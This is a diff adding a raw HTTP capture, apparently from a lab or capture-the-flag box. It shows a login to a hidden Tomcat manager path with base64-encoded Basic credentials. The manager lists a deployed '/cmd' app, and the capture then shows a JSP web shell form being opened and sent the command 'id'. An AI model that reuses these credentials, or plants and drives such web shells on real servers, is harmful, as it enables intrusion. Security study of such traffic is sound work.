@@ -1,0 +1,568 @@
+GET /_M@nag3Me/html HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+
+HTTP/1.1 401 Unauthorized
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 19:00:00 EST
+WWW-Authenticate: Basic realm="Tomcat Manager Application"
+Set-Cookie: JSESSIONID=D47711065D862B1E44A4868B0C8E5480; Path=/_M%40nag3Me; Secure
+Content-Type: text/html
+Transfer-Encoding: chunked
+Date: Sat, 04 Jun 2016 16:56:48 GMT
+
+a0c
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+</html>
+0
+
+GET /_M@nag3Me/html HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 19:00:00 EST
+Set-Cookie: JSESSIONID=D7A894398479A598FA50BCCEA3AFCFAD; Path=/_M%40nag3Me; Secure
+Content-Type: text/html;charset=utf-8
+Transfer-Encoding: chunked
+Date: Sat, 04 Jun 2016 16:56:51 GMT
+
+2000
+<html>
+<head>
+<style>
+H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}  table {
+    width: 100%;
+  }
+  td.page-title {
+    text-align: center;
+    vertical-align: top;
+    font-family:sans-serif,Tahoma,Arial;
+    font-weight: bold;
+    background: white;
+    color: black;
+  }
+  td.title {
+    text-align: left;
+    vertical-align: top;
+    font-family:sans-serif,Tahoma,Arial;
+    font-style:italic;
+    font-weight: bold;
+    background: #D2A41C;
+  }
+  td.header-left {
+    text-align: left;
+    vertical-align: top;
+    font-family:sans-serif,Tahoma,Arial;
+    font-weight: bold;
+    background: #FFDC75;
+  }
+  td.header-center {
+    text-align: center;
+    vertical-align: top;
+    font-family:sans-serif,Tahoma,Arial;
+    font-weight: bold;
+    background: #FFDC75;
+  }
+  td.row-left {
+    text-align: left;
+    vertical-align: middle;
+    font-family:sans-serif,Tahoma,Arial;
+    color: black;
+  }
+  td.row-center {
+    text-align: center;
+    vertical-align: middle;
+    font-family:sans-serif,Tahoma,Arial;
+    color: black;
+  }
+  td.row-right {
+    text-align: right;
+    vertical-align: middle;
+    font-family:sans-serif,Tahoma,Arial;
+    color: black;
+  }
+  TH {
+    text-align: center;
+    vertical-align: top;
+    font-family:sans-serif,Tahoma,Arial;
+    font-weight: bold;
+    background: #FFDC75;
+  }
+  TD {
+    text-align: center;
+    vertical-align: middle;
+    font-family:sans-serif,Tahoma,Arial;
+    color: black;
+  }
+</style>
+<title>/_M@nag3Me</title>
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<table cellspacing="4" width="100%" border="0">
+ <tr>
+  <td colspan="2">
+   <a href="http://www.apache.org/">
+    <img border="0" alt="The Apache Software Foundation" align="left"
+         src="/_M@nag3Me/images/asf-logo.gif">
+   </a>
+   <a href="http://tomcat.apache.org/">
+    <img border="0" alt="The Tomcat Servlet/JSP Container"
+         align="right" src="/_M@nag3Me/images/tomcat.gif">
+   </a>
+  </td>
+ </tr>
+</table>
+<hr size="1" noshade="noshade">
+<table cellspacing="4" width="100%" border="0">
+ <tr>
+  <td class="page-title" bordercolor="#000000" align="left" nowrap>
+   <font size="+2">Tomcat Web Application Manager</font>
+  </td>
+ </tr>
+</table>
+<br>
+
+<table border="1" cellspacing="0" cellpadding="3">
+ <tr>
+  <td class="row-left" width="10%"><small><strong>Message:</strong></small>&nbsp;</td>
+  <td class="row-left"><pre>OK</pre></td>
+ </tr>
+</table>
+<br>
+
+<table border="1" cellspacing="0" cellpadding="3">
+<tr>
+ <td colspan="4" class="title">Manager</td>
+</tr>
+ <tr>
+  <td class="row-left"><a href="/_M@nag3Me/html/list;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">List Applications</a></td>
+  <td class="row-center"><a href="/_M@nag3Me/../docs/html-manager-howto.html;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">HTML Manager Help</a></td>
+  <td class="row-center"><a href="/_M@nag3Me/../docs/manager-howto.html;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">Manager Help</a></td>
+  <td class="row-right"><a href="/_M@nag3Me/status;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">Server Status</a></td>
+ </tr>
+</table>
+<br>
+
+<table border="1" cellspacing="0" cellpadding="3">
+<tr>
+ <td colspan="5" class="title">Applications</td>
+</tr>
+<tr>
+ <td class="header-left"><small>Path</small></td>
+ <td class="header-left"><small>Display Name</small></td>
+ <td class="header-center"><small>Running</small></td>
+ <td class="header-center"><small>Sessions</small></td>
+ <td class="header-left"><small>Commands</small></td>
+</tr>
+<tr>
+ <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small><a href="/">/</a></small></td>
+ <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small>&nbsp;</small></td>
+ <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small>true</small></td>
+ <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small><a href="/_M@nag3Me/html/sessions;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">0</a></small></td>
+ <td class="row-left" bgcolor="#FFFFFF">
+  <small>
+  &nbsp;Start&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/stop;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Stop</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/reload;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Reload</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/undeploy;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Undeploy</a>&nbsp;
+  </small>
+ </td>
+ </tr><tr>
+ <td class="row-left" bgcolor="#FFFFFF">
+  <form method="POST" action="/_M@nag3Me/html/expire;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+  <small>
+  &nbsp;<input type="submit" value="Expire sessions">&nbsp;with idle &ge;&nbsp;<input type="text" name="idle" size="5" value="30">&nbsp;minutes&nbsp;
+  </small>
+  </form>
+ </td>
+</tr>
+<tr>
+ <td class="row-left" bgcolor="#C3F3C3" rowspan="2"><small><a href="/%5FM%40nag3Me/">/_M@nag3Me</a></small></td>
+ <td class="row-left" bgcolor="#C3F3C3" rowspan="2"><small>Tomcat Manager Application</small></td>
+ <td class="row-center" bgcolor="#C3F3C3" rowspan="2"><small>true</small></td>
+ <td class="row-center" bgcolor="#C3F3C3" rowspan="2"><small><a href="/_M@nag3Me/html/sessions;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/%5FM%40nag3Me&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">4</a></small></td>
+ <td class="row-left" bgcolor="#C3F3C3">
+  <small>
+  &nbsp;Start&nbsp;
+  &nbsp;Stop&nbsp;
+  &nbsp;Reload&nbsp;
+  &nbsp;Undeploy&nbsp;
+  </small>
+ </td>
+</tr><tr>
+ <td class="row-left" bgcolor="#C3F3C3">
+  <form method="POST" action="/_M@nag3Me/html/expire;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/%5FM%40nag3Me&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+  <small>
+  &nbsp;<input type="submit" value="Expire sessions">&nbsp;with idle &ge;&nbsp;<input type="text" name="idle" size="5" value="30">&nbsp;minutes&nbsp;
+  </small>
+  </form>
+ </td>
+</tr>
+<tr>
+ <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small><a href="/cmd/">/cmd</a></small></td>
+ <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small>&nbsp;</small></td>
+ <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small>true</small></td>
+ <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small><a href="/_M@nag3Me/html/sessions;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">1</a></small></td>
+ <td class="row-left" bgcolor="#FFFFFF">
+  <small>
+  &nbsp;Start&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/stop;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Stop</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/reload;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Reload</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/undeploy;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path
+174c
+=/cmd&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Undeploy</a>&nbsp;
+  </small>
+ </td>
+ </tr><tr>
+ <td class="row-left" bgcolor="#FFFFFF">
+  <form method="POST" action="/_M@nag3Me/html/expire;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+  <small>
+  &nbsp;<input type="submit" value="Expire sessions">&nbsp;with idle &ge;&nbsp;<input type="text" name="idle" size="5" value="30">&nbsp;minutes&nbsp;
+  </small>
+  </form>
+ </td>
+</tr>
+<tr>
+ <td class="row-left" bgcolor="#C3F3C3" rowspan="2"><small><a href="/host%2Dmanager/">/host-manager</a></small></td>
+ <td class="row-left" bgcolor="#C3F3C3" rowspan="2"><small>Tomcat Manager Application</small></td>
+ <td class="row-center" bgcolor="#C3F3C3" rowspan="2"><small>true</small></td>
+ <td class="row-center" bgcolor="#C3F3C3" rowspan="2"><small><a href="/_M@nag3Me/html/sessions;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/host%2Dmanager&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">0</a></small></td>
+ <td class="row-left" bgcolor="#C3F3C3">
+  <small>
+  &nbsp;Start&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/stop;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/host%2Dmanager&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Stop</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/reload;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/host%2Dmanager&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Reload</a>&nbsp;
+  &nbsp;<a href="/_M@nag3Me/html/undeploy;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/host%2Dmanager&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" onclick="return(confirm('Are you sure?'))">Undeploy</a>&nbsp;
+  </small>
+ </td>
+ </tr><tr>
+ <td class="row-left" bgcolor="#C3F3C3">
+  <form method="POST" action="/_M@nag3Me/html/expire;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?path=/host%2Dmanager&org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+  <small>
+  &nbsp;<input type="submit" value="Expire sessions">&nbsp;with idle &ge;&nbsp;<input type="text" name="idle" size="5" value="30">&nbsp;minutes&nbsp;
+  </small>
+  </form>
+ </td>
+</tr>
+</table>
+<br>
+<table border="1" cellspacing="0" cellpadding="3">
+<tr>
+ <td colspan="2" class="title">Deploy</td>
+</tr>
+<tr>
+ <td colspan="2" class="header-left"><small>Deploy directory or WAR file located on server</small></td>
+</tr>
+<tr>
+ <td colspan="2">
+<form method="post" action="/_M@nag3Me/html/deploy;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+<table cellspacing="0" cellpadding="3">
+<tr>
+ <td class="row-right">
+  <small>Context Path (required):</small>
+ </td>
+ <td class="row-left">
+  <input type="text" name="deployPath" size="20">
+ </td>
+</tr>
+<tr>
+ <td class="row-right">
+  <small>XML Configuration file URL:</small>
+ </td>
+ <td class="row-left">
+  <input type="text" name="deployConfig" size="20">
+ </td>
+</tr>
+<tr>
+ <td class="row-right">
+  <small>WAR or Directory URL:</small>
+ </td>
+ <td class="row-left">
+  <input type="text" name="deployWar" size="40">
+ </td>
+</tr>
+<tr>
+ <td class="row-right">
+  &nbsp;
+ </td>
+ <td class="row-left">
+  <input type="submit" value="Deploy">
+ </td>
+</tr>
+</table>
+</form>
+</td>
+</tr>
+<tr>
+ <td colspan="2" class="header-left"><small>WAR file to deploy</small></td>
+</tr>
+<tr>
+ <td colspan="2">
+<form action="/_M@nag3Me/html/upload;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F" method="post" enctype="multipart/form-data">
+<table cellspacing="0" cellpadding="3">
+<tr>
+ <td class="row-right">
+  <small>Select WAR file to upload</small>
+ </td>
+ <td class="row-left">
+  <input type="file" name="deployWar" size="40">
+ </td>
+</tr>
+<tr>
+ <td class="row-right">
+  &nbsp;
+ </td>
+ <td class="row-left">
+  <input type="submit" value="Deploy">
+ </td>
+</tr>
+</table>
+</form>
+</table>
+<br>
+
+<table border="1" cellspacing="0" cellpadding="3">
+<tr>
+ <td colspan="2" class="title">Diagnostics</td>
+</tr>
+<tr>
+ <td colspan="2" class="header-left"><small>Check to see if a web application has caused a memory leak on stop, reload or undeploy</small></td>
+</tr>
+<tr>
+ <td colspan="2">
+<form method="post" action="/_M@nag3Me/html/findleaks;jsessionid=D7A894398479A598FA50BCCEA3AFCFAD?org.apache.catalina.filters.CSRF_NONCE=92226CAC09F6E578A26C7C14CF3DFD8F">
+<table cellspacing="0" cellpadding="3">
+<tr>
+ <td class="row-left">
+  <input type="submit" value="Find leaks">
+ </td>
+ <td class="row-left">
+  <small>This diagnostic check will trigger a full garbage collection. Use it with extreme caution on production systems.</small>
+ </td>
+</tr>
+</table>
+</form>
+</td>
+</tr>
+</table>
+<br><table border="1" cellspacing="0" cellpadding="3">
+<tr>
+ <td colspan="6" class="title">Server Information</td>
+</tr>
+<tr>
+ <td class="header-center"><small>Tomcat Version</small></td>
+ <td class="header-center"><small>JVM Version</small></td>
+ <td class="header-center"><small>JVM Vendor</small></td>
+ <td class="header-center"><small>OS Name</small></td>
+ <td class="header-center"><small>OS Version</small></td>
+ <td class="header-center"><small>OS Architecture</small></td>
+</tr>
+<tr>
+ <td class="row-center"><small>Apache Tomcat/6.0.39</small></td>
+ <td class="row-center"><small>1.7.0_101-b00</small></td>
+ <td class="row-center"><small>Oracle Corporation</small></td>
+ <td class="row-center"><small>Linux</small></td>
+ <td class="row-center"><small>4.2.0-27-generic</small></td>
+ <td class="row-center"><small>amd64</small></td>
+</tr>
+</table>
+<br>
+
+<hr size="1" noshade="noshade">
+<center><font size="-1" color="#525D76">
+ <em>Copyright &copy; 1999-2014, Apache Software Foundation</em></font></center>
+
+</body>
+</html>
+0
+
+GET /_M@nag3Me/images/asf-logo.gif HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: image/png,image/*;q=0.8,*/*;q=0.5
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.110.140:8443/_M@nag3Me/html
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
+Connection: keep-alive
+If-Modified-Since: Mon, 24 Feb 2014 06:09:43 GMT
+If-None-Match: W/"7279-1393222183000"
+
+HTTP/1.1 304 Not Modified
+Server: Apache-Coyote/1.1
+ETag: W/"7279-1393222183000"
+Date: Sat, 04 Jun 2016 16:56:51 GMT
+
+GET /favicon.ico HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+
+HTTP/1.1 404 Not Found
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=utf-8
+Content-Length: 973
+Date: Sat, 04 Jun 2016 16:56:51 GMT
+
+<html><head><title>Apache Tomcat/6.0.39 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /favicon.ico</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/favicon.ico</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.39</h3></body></html>GET /cmd/ HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.110.140:8443/_M@nag3Me/html
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+
+HTTP/1.1 404 Not Found
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=utf-8
+Content-Length: 959
+Date: Sat, 04 Jun 2016 16:56:54 GMT
+
+<html><head><title>Apache Tomcat/6.0.39 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /cmd/</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/cmd/</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/6.0.39</h3></body></html>GET /cmd/cmd.jsp HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: JSESSIONID=A44E25D2104A4502C9AF9F07D80BBBEC; Path=/cmd; Secure
+Content-Type: text/html
+Content-Length: 180
+Date: Sat, 04 Jun 2016 16:56:57 GMT
+
+
+
+<HTML><BODY>
+Commands with JSP
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+
+</pre>
+</BODY></HTML>
+GET /cmd/cmd.jsp?cmd=id HTTP/1.1
+Host: 192.168.110.140:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
